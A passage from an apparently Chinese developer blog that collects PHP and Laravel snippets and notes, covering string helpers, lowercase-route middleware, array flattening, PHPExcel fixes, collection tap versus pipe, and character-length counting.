class="string">'Ü'</span>],</span><br><span class="line">                    [<span class="string">'ae'</span>, <span class="string">'oe'</span>, <span class="string">'ue'</span>, <span class="string">'AE'</span>, <span class="string">'OE'</span>, <span class="string">'UE'</span>],</span><br><span class="line">                ],</span><br><span class="line">            ];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $languageSpecific[$language] ?? <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">charsArray</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">static</span> $charsArray;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (isset($charsArray)) &#123;</span><br><span class="line">            <span class="keyword">return</span> $charsArray;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $charsArray = [</span><br><span class="line">            <span class="string">'0'</span>    =&gt; [<span class="string">'°'</span>, <span class="string">'₀'</span>, <span class="string">'۰'</span>, <span class="string">'０'</span>],</span><br><span class="line">            <span class="string">'1'</span>    =&gt; [<span class="string">'¹'</span>, <span class="string">'₁'</span>, <span class="string">'۱'</span>, <span class="string">'１'</span>],</span><br><span class="line">            <span class="string">'2'</span>    =&gt; [<span class="string">'²'</span>, <span class="string">'₂'</span>, <span class="string">'۲'</span>, <span class="string">'２'</span>],</span><br><span class="line">            <span class="string">'3'</span>    =&gt; [<span class="string">'³'</span>, <span class="string">'₃'</span>, <span class="string">'۳'</span>, <span class="string">'３'</span>],</span><br><span class="line">            <span class="string">'4'</span>    =&gt; [<span class="string">'⁴'</span>, <span class="string">'₄'</span>, <span class="string">'۴'</span>, <span class="string">'٤'</span>, <span class="string">'４'</span>],</span><br><span class="line">            <span class="string">'5'</span>    =&gt; [<span class="string">'⁵'</span>, <span class="string">'₅'</span>, <span class="string">'۵'</span>, <span class="string">'٥'</span>, <span class="string">'５'</span>],</span><br><span class="line">            <span class="string">'6'</span>    =&gt; [<span class="string">'⁶'</span>, <span class="string">'₆'</span>, <span class="string">'۶'</span>, <span class="string">'٦'</span>, <span class="string">'６'</span>],</span><br><span class="line">            <span class="string">'7'</span>    =&gt; [<span class="string">'⁷'</span>, <span class="string">'₇'</span>, <span class="string">'۷'</span>, <span class="string">'７'</span>],</span><br><span class="line">            <span class="string">'8'</span>    =&gt; [<span class="string">'⁸'</span>, <span class="string">'₈'</span>, <span class="string">'۸'</span>, <span class="string">'８'</span>],</span><br><span class="line">            <span class="string">'9'</span>    =&gt; [<span class="string">'⁹'</span>, <span class="string">'₉'</span>, <span class="string">'۹'</span>, <span class="string">'９'</span>],</span><br><span class="line">            &#125;</span><br><span class="line"> 将utf - <span class="number">8</span>值转换为ASCII           </span><br><span class="line">ascii($s);<span class="comment">//laravel</span></span><br><span class="line"><span class="comment">//在给定值之前获取字符串的部分。</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">before</span>(<span class="params">$subject, $search</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $search === <span class="string">''</span> ? $subject : explode($search, $subject)[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line"> <span class="comment">//将一个值转换为一个大写的大写字母</span></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">studly</span>(<span class="params">$value</span>)</span></span><br><span class="line"><span class="function">         </span>&#123;</span><br><span class="line">                 $key = $value;</span><br><span class="line"> </span><br><span class="line">                 <span class="keyword">if</span> (isset(<span class="keyword">static</span>::$studlyCache[$key])) &#123;</span><br><span class="line">                         <span class="keyword">return</span> <span class="keyword">static</span>::$studlyCache[$key];</span><br><span class="line">                 &#125;</span><br><span class="line"> </span><br><span class="line">                 $value = ucwords(str_replace([<span class="string">'-'</span>, <span class="string">'_'</span>], <span class="string">' '</span>, $value));</span><br><span class="line"> </span><br><span class="line">                 <span class="keyword">return</span> <span class="keyword">static</span>::$studlyCache[$key] = str_replace(<span class="string">' '</span>, <span class="string">''</span>, $value);</span><br><span class="line">         &#125;</span><br></pre></td></tr></table></figure>
<h3 id="路由为不区分大小写"><a href="#路由为不区分大小写" class="headerlink" title="路由为不区分大小写"></a>路由为不区分大小写</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">添加中间件. LowerCaseRoutes</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">namespace App\Http\Middleware;</span><br><span class="line"></span><br><span class="line">use Closure;</span><br><span class="line">use \Illuminate\Support\Facades\Redirect;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 把大写uri转换为小写.已经实现路由不区分大小写，如果有大写，会 301 跳转到小写的地址.</span></span><br><span class="line"><span class="comment">               </span></span><br><span class="line"><span class="comment">https://learnku.com/laravel/t/27783</span></span><br><span class="line"><span class="comment"> * Class LowerCaseRoutes</span></span><br><span class="line"><span class="comment"> * @package App\Http\Middleware</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LowerCaseRoutes</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Handle an incoming request.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * @param  \Illuminate\Http\Request  $request</span></span><br><span class="line"><span class="comment">     * @param  \Closure  $next</span></span><br><span class="line"><span class="comment">     * @return mixed</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">handle</span>(<span class="params">$request, Closure $next</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/([A-Z]+)/'</span>, $request-&gt;path(), $match)) &#123;</span><br><span class="line">            $newRoute = str_replace($request-&gt;path(), strtolower($request-&gt;path()), $request-&gt;fullUrl());</span><br><span class="line">            <span class="keyword">return</span> Redirect::to($newRoute, <span class="number">301</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $next($request);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="数组扁平化"><a href="#数组扁平化" class="headerlink" title="数组扁平化"></a>数组扁平化</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">$data = [</span><br><span class="line">    <span class="string">'testArray'</span> =&gt; [</span><br><span class="line">        <span class="string">'string1'</span>,</span><br><span class="line">        <span class="string">'string2'</span>,</span><br><span class="line">        [</span><br><span class="line">            <span class="string">'string1'</span>,</span><br><span class="line">            <span class="string">'string2'</span>,</span><br><span class="line">        ],</span><br><span class="line">    ],</span><br><span class="line">    <span class="string">'teststring'</span></span><br><span class="line">];</span><br><span class="line">echo <span class="string">"&lt;pre&gt;"</span>;https:<span class="comment">//learnku.com/articles/24318</span></span><br><span class="line"></span><br><span class="line">print_r(iterator_to_array(</span><br><span class="line">        <span class="keyword">new</span> RecursiveIteratorIterator(</span><br><span class="line">            <span class="keyword">new</span> RecursiveArrayIterator($data)</span><br><span class="line">        ),</span><br><span class="line">        <span class="literal">false</span>  <span class="comment">// use_keys:默认true</span></span><br><span class="line">    )</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*Array</span></span><br><span class="line"><span class="comment">(</span></span><br><span class="line"><span class="comment">    [0] =&gt; string1</span></span><br><span class="line"><span class="comment">    [1] =&gt; string2</span></span><br><span class="line"><span class="comment">    [2] =&gt; string1</span></span><br><span class="line"><span class="comment">    [3] =&gt; string2</span></span><br><span class="line"><span class="comment">    [4] =&gt; teststring</span></span><br><span class="line"><span class="comment">)*/</span></span><br><span class="line">collect ($data)-&gt;flatten ()-&gt;all ()</span><br></pre></td></tr></table></figure>
<h3 id="phpexcel科学计数法"><a href="#phpexcel科学计数法" class="headerlink" title="phpexcel科学计数法"></a>phpexcel科学计数法</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">拼一个 \t</span><br><span class="line">设置单元格格式为文本格式https:<span class="comment">//learnku.com/articles/23696</span></span><br><span class="line"></span><br><span class="line">          $card_no_style = [</span><br><span class="line">                        <span class="string">'numberFormat'</span> =&gt; [</span><br><span class="line">                            <span class="string">'formatCode'</span> =&gt; NumberFormat::FORMAT_TEXT</span><br><span class="line">                        ]</span><br><span class="line"></span><br><span class="line">                    ];</span><br><span class="line">                    $obj_sheet-&gt;getStyle(Coordinate::stringFromColumnIndex($column) . <span class="string">"1"</span> . <span class="string">":"</span> . Coordinate::stringFromColumnIndex($column) . count($data))-&gt;applyFromArray($card_no_style);</span><br></pre></td></tr></table></figure>
<h3 id="PHPExcel-在-PHP7-0-以上版本报错"><a href="#PHPExcel-在-PHP7-0-以上版本报错" class="headerlink" title="PHPExcel 在 PHP7.0 以上版本报错"></a>PHPExcel 在 PHP7.0 以上版本报错</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'break'</span> not <span class="keyword">in</span> the <span class="string">'loop'</span> or <span class="string">'switch'</span> context</span><br><span class="line"></span><br><span class="line">PHPExcel\Calculation\Functions.php 　LINE: <span class="number">581</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (($value === NULL) || (is_float($value)) || (is_int($value))) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125; elseif(is_bool($value)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">4</span>;</span><br><span class="line">        &#125; elseif(is_array($value)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">64</span>;</span><br><span class="line">                <span class="keyword">break</span>;<span class="comment">//这是581行</span></span><br><span class="line">        &#125; elseif(is_string($value)) &#123;</span><br><span class="line">            <span class="comment">//  Errors</span></span><br><span class="line">            <span class="keyword">if</span> ((strlen($value) &gt; <span class="number">0</span>) &amp;&amp; ($value&#123;<span class="number">0</span>&#125; == <span class="string">'#'</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">16</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">         <span class="keyword">return</span> 跳出当前函数或者循环直接返回 <span class="keyword">break</span> 并会执行而报错https:<span class="comment">//learnku.com/articles/26675</span></span><br><span class="line">        </span><br><span class="line">        方案 <span class="number">1</span>: 将 <span class="number">581</span> 行的 <span class="keyword">break</span> 注释掉</span><br><span class="line">        </span><br><span class="line">        方案 <span class="number">2</span> : 将 PHPExcel 升级到 <span class="number">1.81</span> 版本以上</span><br><span class="line">        </span><br><span class="line">        方案三：使用 PHPExcel 的升级产品 PhpSpreadsheet</span><br><span class="line">        </span><br><span class="line">        方案 <span class="number">1</span> 修改源码 不推荐</span><br><span class="line">        方案 <span class="number">2</span>PHPExcel 已不再维护 故不推荐</span><br><span class="line">        对于框架版本国过老 或经多手的项目 建议使用 方案 <span class="number">1</span>,<span class="number">2</span></span><br><span class="line">        </span><br><span class="line">        方案 <span class="number">3</span> 为 PHPExcel 的替代品升级产品 而且在维护 新项目推荐方案 <span class="number">3</span></span><br><span class="line">        </span><br><span class="line">        PHPExcel <span class="number">1.8</span><span class="number">.1</span> 地址 https:<span class="comment">//github.com/PHPOffice/PHPExcel/commit/372c7cbb695a6f6f1e62649381aeaa37e7e70b32</span></span><br><span class="line">        </span><br><span class="line">        PhpSpreadsheet 安装 如下</span><br><span class="line">        </span><br><span class="line">        文档地址：https:<span class="comment">//phpspreadsheet.readthedocs.io/en/latest/#getting-started</span></span><br><span class="line">        </span><br><span class="line">        GitHub 下载：https:<span class="comment">//github.com/PHPOffice/PhpSpreadsheet</span></span><br><span class="line">        </span><br><span class="line">        composer 安装：composer <span class="built_in">require</span> phpoffice/phpspreadsheet</span><br><span class="line">        </span><br><span class="line">        PHPExcel 与 PhpSpreadsheet？</span><br><span class="line">        </span><br><span class="line">        PhpSpreadsheet 是 PHPExcel 的下一个版本。它打破了兼容性，大大提高了代码库质量（命名空间，PSR 合规性，最新 PHP 语言功能的使用等）。</span><br><span class="line">        </span><br><span class="line">        因为所有的努力都转移到了 PhpSpreadsheet，所以不再维护 PHPExcel。PHPExcel，补丁和新功能的所有贡献都应该以 PhpSpreadsheet master 分支为目标。</span><br></pre></td></tr></table></figure>
<h3 id="foreach"><a href="#foreach" class="headerlink" title="foreach"></a>foreach</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$data=array(<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>);</span><br><span class="line">  foreach($data <span class="keyword">as</span> $key=&gt;$value)&#123;</span><br><span class="line">       $value=&amp;$data[$key];</span><br><span class="line">  &#125;</span><br><span class="line">问题<span class="number">1</span>:程序执行时，每一次循环结束后变量$data的值是什么？请解释。</span><br><span class="line">问题<span class="number">2</span>:程序执行完后，变量$data的值是什么？请解释。</span><br><span class="line"><span class="comment">//第一次遍历 结果还是 【a,b,c】</span></span><br><span class="line"><span class="comment">//第二次遍历</span></span><br><span class="line">$data[<span class="number">0</span>]=<span class="string">'a'</span>;<span class="comment">//第一次遍历的时候$data[0]=a</span></span><br><span class="line">$val=&amp;$data[<span class="number">0</span>];<span class="comment">//这边已经把$data[0]引用指向$val 第一次遍历以后</span></span><br><span class="line">$val=b <span class="comment">//现在$val 一旦变了 那么$data[0]也就改变了 所以变成$data[0]=b</span></span><br><span class="line">$data=[b,b,c];<span class="comment">//最后结果变成了</span></span><br><span class="line"><span class="comment">//第三次遍历</span></span><br><span class="line">$data[<span class="number">1</span>]=b;<span class="comment">//第二次遍历的时候$data[1]变成了b</span></span><br><span class="line">$val=&amp;$data[<span class="number">1</span>];<span class="comment">//第二次遍历的时候$val的引用变成了$data[1]</span></span><br><span class="line">$val=c;<span class="comment">//所以这边$val变成了c 那么$data[1]也就变成了c</span></span><br><span class="line">$data=[<span class="string">'b'</span>,<span class="string">'c'</span>,<span class="string">'c'</span>]<span class="comment">//最后结果变成了</span></span><br><span class="line"><span class="comment">//最后的$data的结果https://learnku.com/articles/26374</span></span><br><span class="line">【b,c,c】</span><br><span class="line">list($b, $a) = array($a, $b);</span><br></pre></td></tr></table></figure>
<h3 id="tap"><a href="#tap" class="headerlink" title="tap"></a>tap</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">$items = [</span><br><span class="line">    [<span class="string">'name'</span> =&gt; <span class="string">'David Charleston'</span>, <span class="string">'member'</span> =&gt; <span class="number">1</span>, <span class="string">'active'</span> =&gt; <span class="number">1</span>],</span><br><span class="line">    [<span class="string">'name'</span> =&gt; <span class="string">'Blain Charleston'</span>, <span class="string">'member'</span> =&gt; <span class="number">0</span>, <span class="string">'active'</span> =&gt; <span class="number">0</span>],</span><br><span class="line">    [<span class="string">'name'</span> =&gt; <span class="string">'Megan Tarash'</span>, <span class="string">'member'</span> =&gt; <span class="number">1</span>, <span class="string">'active'</span> =&gt; <span class="number">1</span>],</span><br><span class="line">    [<span class="string">'name'</span> =&gt; <span class="string">'Jonathan Phaedrus'</span>, <span class="string">'member'</span> =&gt; <span class="number">1</span>, <span class="string">'active'</span> =&gt; <span class="number">1</span>],</span><br><span class="line">    [<span class="string">'name'</span> =&gt; <span class="string">'Paul Jackson'</span>, <span class="string">'member'</span> =&gt; <span class="number">0</span>, <span class="string">'active'</span> =&gt; <span class="number">1</span>]</span><br><span class="line">];</span><br><span class="line">先将数组转为集合，再进行数据的过滤，最后在两个不同的节点调用 tap 方法，返回打印结果：</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> collect($items)</span><br><span class="line">    -&gt;where(<span class="string">'active'</span>, <span class="number">1</span>)</span><br><span class="line">    -&gt;tap(<span class="function"><span class="keyword">function</span>(<span class="params">$collection</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> var_dump($collection-&gt;pluck(<span class="string">'name'</span>));</span><br><span class="line">    &#125;)</span><br><span class="line">    -&gt;where(<span class="string">'member'</span>, <span class="number">1</span>)</span><br><span class="line">    -&gt;tap(<span class="function"><span class="keyword">function</span>(<span class="params">$collection</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> var_dump($collection-&gt;pluck(<span class="string">'name'</span>));</span><br><span class="line">    &#125;);</span><br><span class="line">第一次调用 tap 方法输出结果：https:<span class="comment">//learnku.com/laravel/t/26361</span></span><br><span class="line"></span><br><span class="line">David Charleston, Megan Tarash, Jonathan Phaedrus, Paul Jackson</span><br><span class="line">第二次调用 tap 方法输出结果：</span><br><span class="line"></span><br><span class="line">David Charleston, Megan Tarash, Jonathan Phaedrus</span><br><span class="line">Tap vs Pipe</span><br><span class="line"></span><br><span class="line">Laravel 也提供了另一个类似 tap 的集合操作方法 -- pipe，两者在集合调用上很类似，却有一个主要的区别：</span><br><span class="line"></span><br><span class="line">通过调用 tap 方法不会改变原集合的结果，而 pipe 方法会根据返回值修改元集合的结果。示例如下：</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> collect($items)</span><br><span class="line">    -&gt;where(<span class="string">'active'</span>, <span class="number">1</span>)</span><br><span class="line">    -&gt;pipe(<span class="function"><span class="keyword">function</span> (<span class="params">$collection</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $collection-&gt;push([<span class="string">'name'</span> =&gt; <span class="string">'John Doe'</span>]);</span><br><span class="line">    &#125;);</span><br><span class="line"><span class="comment">// David Charleston, Megan Tarash, Jonathan Phaedrus, Paul Jackson, John Doe</span></span><br></pre></td></tr></table></figure>
<h3 id="artisan日志-root-权限解决"><a href="#artisan日志-root-权限解决" class="headerlink" title="artisan日志 root 权限解决"></a>artisan日志 root 权限解决</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">bootstrap/app.php 中写入以下配置： </span><br><span class="line">https:<span class="comment">//learnku.com/articles/26444</span></span><br><span class="line">$app-&gt;configureMonologUsing(<span class="function"><span class="keyword">function</span>(<span class="params">Monolog\Logger $monolog</span>) </span>&#123;</span><br><span class="line">    $filename = storage_path(<span class="string">'logs/laravel-'</span>.php_sapi_name().<span class="string">'.log'</span>);</span><br><span class="line">    $handler = <span class="keyword">new</span> Monolog\Handler\RotatingFileHandler($filename);</span><br><span class="line">    $monolog-&gt;pushHandler($handler);</span><br><span class="line">&#125;);</span><br><span class="line">正确的做法应该是用 www 用户执行 artisan 命令，因为不光是日志，还有可能有缓存、 storage 等文件可能被 root 用户创建而导致 www 用户无权操作。</span><br><span class="line">脚本写在 crontab 中的，如果我想用 www 用户执行 artisan 命令，我应该怎么写 crontab 呢 crontab -e -u www</span><br><span class="line">php cli 或者 fpm 都是用 www 用户去执行 就不会出现你这个问题的</span><br><span class="line">不想使用单独的用户配置 crontab，也可以这么干，比如：配置在 root 账号下</span><br><span class="line"></span><br><span class="line">su www -s /bin/bash -c “php artisan schedule:run”</span><br></pre></td></tr></table></figure>
<h3 id="英文字符占-0-5-个，中文字符占-1-个"><a href="#英文字符占-0-5-个，中文字符占-1-个" class="headerlink" title="英文字符占 0.5 个，中文字符占 1 个"></a>英文字符占 0.5 个，中文字符占 1 个</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//learnku.com/articles/4956/following-my-unique-needs-of-the-english-characters-accounted-for-05-chinese-characters-accounted-for-1#topnav</span></span><br><span class="line">$double = str_word_count(preg_replace(<span class="string">'([a-zA-Z0-9_])'</span>, <span class="string">''</span>, $value));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 计算单字节.</span></span><br><span class="line">    preg_match_all(<span class="string">'/[a-zA-Z0-9_]/'</span>, $value, $single);</span><br><span class="line">    $single = count($single[<span class="number">0</span>]) / <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 多子节长度.</span></span><br><span class="line">    $double = mb_strlen(preg_replace(<span class="string">'([a-zA-Z0-9_])'</span>, <span class="string">''</span>, $value));</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">the_fucking_length_function</span>(<span class="params">$str</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> strlen(mb_convert_encoding($str, <span class="string">'GB2312'</span>)) / <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line">$length = (strlen($value) + mb_strlen($value)) / <span class="number">2</span>;</span><br><span class="line"><span class="comment">//这个方法是好的，缺点就只有一个，就是精度问题，因为 utf-8 中只有两万多个汉字是 3 字节，还有六万多的不常用汉字是 4 字节的，附带 emoji 之类的就</span></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">mbstrlen</span>(<span class="params">$str</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> ceil((strlen($str) + mb_strlen($str, <span class="string">"UTF8"</span>)) / <span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">str_display_len</span> (<span class="params">string $str</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    preg_match_all(<span class="string">'/[a-zA-Z0-9_]/'</span>, $str, $single);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> count($single[<span class="number">0</span>]) / <span class="number">2</span> + mb_strlen(preg_replace(<span class="string">'([a-zA-Z0-9_])'</span>, <span class="string">''</span>, $str));</span><br><span class="line">&#125;</span><br><span class="line">https:<span class="comment">//www.php.net/manual/zh/function.mb-strwidth.php</span></span><br></pre></td></tr></table></figure>
<h3 id="bas64简历"><a href="#bas64简历" class="headerlink" title="bas64简历"></a>bas64简历</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//learnku.com/laravel/t/25907</span></span><br></pre></td></tr></table></figure>
<h3 id="PHP-排名算法支持重复排名"><a href="#PHP-排名算法支持重复排名" class="headerlink" title="PHP 排名算法支持重复排名"></a>PHP 排名算法支持重复排名</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//https://learnku.com/articles/26769</span></span><br><span class="line">$arr = [</span><br><span class="line">    [</span><br><span class="line">        <span class="string">'id'</span>=&gt;<span class="number">1</span>,</span><br><span class="line">        <span class="string">'score'</span>=&gt;<span class="number">10</span>,</span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">'id'</span>=&gt;<span class="number">2</span>,</span><br><span class="line">        <span class="string">'score'</span>=&gt;<span class="number">30</span>,</span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">'id'</span>=&gt;<span class="number">3</span>,</span><br><span class="line">        <span class="string">'score'</span>=&gt;<span class="number">50</span>,</span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">'id'</span>=&gt;<span class="number">4</span>,</span><br><span class="line">        <span class="string">'score'</span>=&gt;<span class="number">50</span>,</span><br><span class="line">    ]</span><br><span class="line">]</span><br><span class="line">你想从小到大，取出前三名，如果第四名和第三名也相同，也取出来</span><br><span class="line"></span><br><span class="line">先按 score 排序</span><br><span class="line"></span><br><span class="line">array_multisort(array_column($arr,<span class="string">'score'</span>),SORT_ASC,$arr);</span><br><span class="line">前三名</span><br><span class="line"></span><br><span class="line"> $results = array_slice($arr, <span class="number">0</span>, <span class="number">3</span>, <span class="literal">true</span>);</span><br><span class="line">然后前三名的最后一名和之后的比较</span><br><span class="line"></span><br><span class="line">$length = count($arr);</span><br><span class="line">$resultLength = count($results);</span><br><span class="line"></span><br><span class="line"><span class="comment">//$resultLength 比 $length小说明$arr 